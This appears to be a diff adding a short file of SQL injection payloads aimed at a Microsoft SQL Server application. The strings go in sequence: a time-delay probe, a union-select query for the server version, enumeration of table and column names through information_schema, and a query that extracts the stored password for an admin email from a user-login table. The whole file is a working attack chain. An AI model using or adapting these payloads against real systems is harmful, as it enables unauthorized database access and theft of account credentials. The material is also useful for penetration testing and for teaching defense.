@@ -1,0 +1,12 @@
+SQL Injection Payload
+
+' waitfor delay '0:0:10' -- -
+ 
+' union select null,@@version,null,null,null,null,null,null,null,null,null -- -
+ 
+' union select null,(select STRING_AGG(table_name, ',') as table_name from information_schema.tables),null,null,null,null,null,null,null,null,null -- -
+ 
+' union select null,(select STRING_AGG(column_name, ',') as column_name from information_schema.columns where table_name = 'Trn_User_Login'),null,null,null,null,null,null,null,null,null --
+ 
+' union select null,(select Password from redfoxsec.Trn_User_Login where Email_Id='admin@gmail.com'),null,null,null,null,null,null,null,null,null -- -
+
